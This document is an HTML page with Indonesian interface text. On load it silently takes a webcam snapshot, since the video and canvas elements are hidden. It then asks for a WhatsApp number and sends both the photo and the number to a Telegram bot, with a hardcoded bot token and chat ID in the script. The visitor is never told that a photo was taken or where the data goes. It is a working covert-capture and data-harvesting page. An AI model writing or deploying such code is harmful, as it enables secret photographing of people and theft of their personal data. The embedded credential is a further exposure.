<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Capture & Kirim Telegram</title>
  <style>
    video, canvas { display: none; }
    #formContainer { display: none; margin-top: 20px; }
  </style>
</head>
<body>
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <div id="formContainer">
    <h3>Masukkan Nomor WhatsApp</h3>
    <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" />
    <button onclick="sendToTelegram()">Kirim Sekarang</button>
  </div>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");
    const form = document.getElementById("formContainer");

    const botToken = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY'; // Ganti dengan token bot Telegram kamu
    const chatId = '7041008009';     // Ganti dengan chat ID tujuan

    let photoBlob = null;

    async function startCamera() {
      // Cek HTTPS
      if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
        alert("Akses kamera hanya bisa dilakukan di HTTPS atau localhost.");
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            const dataURL = canvas.toDataURL("image/png");
            photoBlob = dataURLtoBlob(dataURL);
            form.style.display = "block";
          }, 2000);
        };
      } catch (err) {
        alert("Gagal mengakses kamera. Pastikan kamu mengizinkan kamera dan akses HTTPS.");
        console.error(err);
      }
    }

    function sendToTelegram() {
      const waNumber = document.getElementById("waNumber").value.trim();
      if (!waNumber || !photoBlob) {
        alert("Masukkan nomor WhatsApp dan pastikan foto berhasil diambil.");
        return;
      }

      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("caption", `Nomor WhatsApp: ${waNumber}`);
      formData.append("photo", photoBlob, "photo.png");

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      })
        .then(res => res.json())
        .then(data => {
          alert("Berhasil dikirim ke Telegram.");
          form.innerHTML = "<p>Data terkirim.</p>";
        })
        .catch(err => {
          console.error("Gagal kirim ke Telegram:", err);
          alert("Gagal mengirim ke Telegram.");
        });
    }

    function dataURLtoBlob(dataURL) {
      const arr = dataURL.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], { type: mime });
    }

    window.onload = startCamera;
  </script>
</body>
</html>
